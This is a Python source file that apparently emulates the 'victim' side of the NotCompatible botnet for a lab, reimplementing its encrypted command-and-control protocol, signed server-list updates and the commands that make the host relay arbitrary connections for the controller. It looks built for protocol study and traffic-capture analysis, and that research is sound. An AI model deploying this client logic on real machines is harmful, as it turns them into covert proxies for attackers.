from __future__ import annotations

import argparse
import logging
import os
import selectors
import socket
import struct
import time
from dataclasses import dataclass
from pathlib import Path

from Crypto.PublicKey import RSA

from shared.crypto import load_key, verify_digest_raw
from shared.protocol import (
    Packet,
    ProtocolError,
    container,
    dword,
    int64,
    port,
    raw,
    word,
)
from shared.session import EncryptedPacketSession, SessionClosed, client_handshake


LOG = logging.getLogger("victim")


@dataclass
class ServerAddress:
    host: str
    port: int


@dataclass
class ProxyChannel:
    channel_id: int
    sock: socket.socket
    destination: ServerAddress


class Victim:
    def __init__(self, args) -> None:
        self.args = args
        self.global_public = load_key(args.global_public).public_key()
        self.local_rsa = RSA.generate(1024)
        self.uuid = os.urandom(16)
        self.p2p_port = args.p2p_port
        self.group = 0
        self.lid = 1
        self.groups: dict[int, list[ServerAddress]] = {
            0: [ServerAddress(args.gw_host, args.gw_port)]
        }
        self.proxy_channels: dict[int, ProxyChannel] = {}
        self.selector = selectors.DefaultSelector()
        self.running = True
        self.first_boot = True
        self.cleaned_up = False

    def current_server(self) -> ServerAddress:
        servers = self.groups.get(self.group)
        if not servers:
            LOG.warning("Group %d is unavailable; falling back to group 0", self.group)
            self.group = 0
            servers = self.groups[0]
        return servers[0]

    def build_hello(self) -> Packet:
        # The malware converts its internal little-endian port to network order here.
        hello_port = raw("PORT", struct.pack(">H", self.p2p_port))
        children = [
            dword("VER", 2),
            raw("UUID", self.uuid),
            hello_port,
            word("GROUP", self.group),
            word("LDGROUP", 1000),
            int64("LID", self.lid),
            dword("CT", 1),
        ]
        if self.first_boot:
            children.append(raw("FB"))
            self.first_boot = False
        return container("HELO", *children)

    def connect_control(self) -> EncryptedPacketSession:
        server = self.current_server()
        LOG.info("Connecting to group %d server %s:%d", self.group, server.host, server.port)
        sock = socket.create_connection((server.host, server.port), timeout=5)
        sock.settimeout(None)
        session = client_handshake(sock, self.local_rsa, f"{server.host}:{server.port}")
        LOG.info("RSA/RC4 handshake complete with group %d", self.group)
        hello = self.build_hello()
        session.send_packet(hello)
        LOG.info("Victim -> server HELO\n%s", hello.pretty(1))
        return session

    def verify_and_load_set(self, packet: Packet) -> bool:
        try:
            data = packet.require("DATA")
            signature = packet.require("Sign").data
            new_lid = data.require("LID").as_int64()
        except ProtocolError as exc:
            LOG.warning("Rejected malformed SET: %s", exc)
            return False

        if new_lid <= self.lid:
            LOG.warning("Ignored SET LID=%d because current LID=%d", new_lid, self.lid)
            return False
        if not verify_digest_raw(self.global_public, data.digest(), signature):
            LOG.warning("Rejected SET LID=%d: invalid RSAGlobal signature", new_lid)
            return False

        new_groups: dict[int, list[ServerAddress]] = {}
        for group_packet in (child for child in data.children if child.tag == "GROUP"):
            group_id = group_packet.require("ID").as_word()
            servers: list[ServerAddress] = []
            for child in group_packet.children:
                if child.tag == "SERV":
                    servers.append(
                        ServerAddress(
                            child.require("IP").as_ip(),
                            child.require("PORT").as_port(),
                        )
                    )
                elif child.tag == "DOM":
                    servers.append(
                        ServerAddress(
                            child.require("NAME").as_string(),
                            child.require("PORT").as_port(),
                        )
                    )
            if servers:
                new_groups[group_id] = servers

        if not new_groups:
            LOG.warning("Rejected SET LID=%d: no usable groups", new_lid)
            return False
        self.groups = new_groups
        self.lid = new_lid
        LOG.info("Accepted signed SET LID=%d with groups=%s", new_lid, sorted(new_groups))
        return True

    def gateway_loop(self, session: EncryptedPacketSession) -> None:
        while self.running:
            packet = session.recv_one(timeout=15)
            LOG.info("GW -> Victim %s", packet.tag)
            if packet.tag == "SET":
                self.verify_and_load_set(packet)
            elif packet.tag == "SETGROUP":
                requested_group = packet.as_word()
                self.group = requested_group
                LOG.info("SETGROUP selected group %d; closing gateway session", requested_group)
                session.close()
                return
            elif packet.tag == "PING":
                session.send_packet(raw("PONG"))

    def send_error(self, session: EncryptedPacketSession, number: int, channel: int) -> None:
        session.send_packet(container("ERR", dword("N", number), dword("CH", channel)))

    def open_proxy(self, session: EncryptedPacketSession, packet: Packet) -> None:
        try:
            channel = packet.require("CH").as_dword()
            target_port = packet.require("PORT").as_port()
            ip_packet = packet.get("IP")
            domain_packet = packet.get("DOM")
            if ip_packet is None and domain_packet is None:
                raise ProtocolError("CONN requires IP or DOM")
            target_host = (
                ip_packet.as_ip() if ip_packet is not None else domain_packet.as_string()
            )
        except ProtocolError as exc:
            LOG.warning("Malformed CONN: %s", exc)
            self.send_error(session, 1, 0)
            return

        if channel in self.proxy_channels:
            self.send_error(session, 2, channel)
            return

        try:
            target = socket.create_connection((target_host, target_port), timeout=3)
            target.setblocking(False)
        except OSError as exc:
            LOG.info("CONN CH=%d to %s:%d failed: %s", channel, target_host, target_port, exc)
            session.send_packet(container("NOCN", dword("CH", channel)))
            return

        proxy = ProxyChannel(channel, target, ServerAddress(target_host, target_port))
        self.proxy_channels[channel] = proxy
        self.selector.register(target, selectors.EVENT_READ, proxy)
        local_port = target.getsockname()[1]
        session.send_packet(container("CONN", dword("CH", channel), port("PORT", local_port)))
        LOG.info(
            "Opened CH=%d Victim:%d -> %s:%d",
            channel,
            local_port,
            target_host,
            target_port,
        )

    def send_to_proxy(self, session: EncryptedPacketSession, packet: Packet) -> None:
        try:
            channel = packet.require("CH").as_dword()
            data = packet.require("DT").data
        except ProtocolError:
            self.send_error(session, 1, 0)
            return
        proxy = self.proxy_channels.get(channel)
        if proxy is None:
            self.send_error(session, 3, channel)
            return
        try:
            proxy.sock.sendall(data)
            LOG.info("SEND CH=%d -> target %r [%s]", channel, data, data.hex(" "))
        except OSError:
            self.close_proxy(session, channel)

    def close_proxy(self, session: EncryptedPacketSession, channel: int) -> None:
        proxy = self.proxy_channels.pop(channel, None)
        if proxy is None:
            self.send_error(session, 3, channel)
            return
        try:
            self.selector.unregister(proxy.sock)
        except Exception:
            pass
        try:
            proxy.sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        proxy.sock.close()
        session.send_packet(container("DISC", dword("CH", channel)))
        LOG.info("Closed CH=%d and sent DISC", channel)

    def handle_control_packet(
        self,
        session: EncryptedPacketSession,
        packet: Packet,
    ) -> None:
        if packet.tag == "PING":
            session.send_packet(raw("PONG"))
            LOG.info("C2 -> PING; Victim -> PONG")
        elif packet.tag == "SET":
            self.verify_and_load_set(packet)
        elif packet.tag == "SETGROUP":
            self.group = packet.as_word()
            LOG.info("C2 selected group %d", self.group)
        elif packet.tag == "CONN":
            self.open_proxy(session, packet)
        elif packet.tag == "SEND":
            self.send_to_proxy(session, packet)
        elif packet.tag == "SHUT":
            channel_packet = packet.get("CH")
            if channel_packet is None or packet.get("DT") is None:
                self.send_error(session, 1, 0)
                return
            channel = channel_packet.as_dword()
            channel_was_open = channel in self.proxy_channels
            self.close_proxy(session, channel)
            if channel_was_open and not self.proxy_channels:
                LOG.info("All proxy channels closed; ending finite laboratory session")
                self.running = False
        else:
            LOG.info("Ignored C2 command %s", packet.tag)

    def target_reads(self, session: EncryptedPacketSession) -> None:
        # Windows select() rejects three empty descriptor sets (WSAEINVAL).
        if not self.proxy_channels:
            return
        for key, _ in self.selector.select(timeout=0):
            proxy: ProxyChannel = key.data
            try:
                data = proxy.sock.recv(8192)
            except BlockingIOError:
                continue
            except OSError:
                data = b""
            if not data:
                self.close_proxy(session, proxy.channel_id)
                continue
            packet = container(
                "RECV",
                dword("CH", proxy.channel_id),
                raw("DT", data),
            )
            session.send_packet(packet)
            LOG.info(
                "Target -> RECV CH=%d DT=%r [%s]",
                proxy.channel_id,
                data,
                data.hex(" "),
            )

    def operational_loop(self, session: EncryptedPacketSession) -> None:
        while self.running:
            try:
                packets = session.receive_available(0.1)
            except SessionClosed:
                LOG.warning("Operational C2 disconnected")
                return
            for packet in packets:
                LOG.info("C2 -> Victim %s", packet.tag)
                self.handle_control_packet(session, packet)
            self.target_reads(session)

    def cleanup(self) -> None:
        if self.cleaned_up:
            return
        self.cleaned_up = True
        for proxy in list(self.proxy_channels.values()):
            try:
                self.selector.unregister(proxy.sock)
            except Exception:
                pass
            proxy.sock.close()
        self.proxy_channels.clear()
        self.selector.close()

    def run(self) -> None:
        session = None
        try:
            session = self.connect_control()
            self.gateway_loop(session)
            if not self.running:
                return
            time.sleep(self.args.reconnect_delay)
            session = self.connect_control()
            self.operational_loop(session)
        finally:
            if session is not None:
                session.close()
            self.cleanup()


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    parser = argparse.ArgumentParser(description="NotCompatible victim/proxy emulator")
    parser.add_argument("--gw-host", default="127.0.0.1")
    parser.add_argument("--gw-port", type=int, default=18443)
    parser.add_argument("--p2p-port", type=int, default=30000)
    parser.add_argument("--reconnect-delay", type=float, default=0.25)
    parser.add_argument(
        "--global-public",
        default=str(root / "keys" / "global_public.pem"),
    )
    parser.add_argument(
        "--local-private-out",
        default=None,
        help="Exporta la RSALocal efímera para descifrar las claves RC4 de la captura",
    )
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [VICTIM] %(message)s",
        datefmt="%H:%M:%S",
    )
    victim = Victim(args)
    if args.local_private_out:
        private_path = Path(args.local_private_out)
        private_path.parent.mkdir(parents=True, exist_ok=True)
        private_path.write_bytes(victim.local_rsa.export_key("PEM"))
        private_path.chmod(0o600)
        LOG.info("Exported RSALocal private key to %s", private_path)
    LOG.info("Generated one RSALocal key pair for GW and C2 sessions")
    LOG.info("Starting victim proxy (Ctrl+C to stop)")
    try:
        victim.run()
    except KeyboardInterrupt:
        LOG.info("Ctrl+C received, shutting down")
        victim.running = False
        victim.cleanup()
    except (OSError, ValueError, TimeoutError, SessionClosed, ProtocolError) as exc:
        LOG.error("Victim stopped: %s", exc)
        victim.cleanup()


if __name__ == "__main__":
    main()
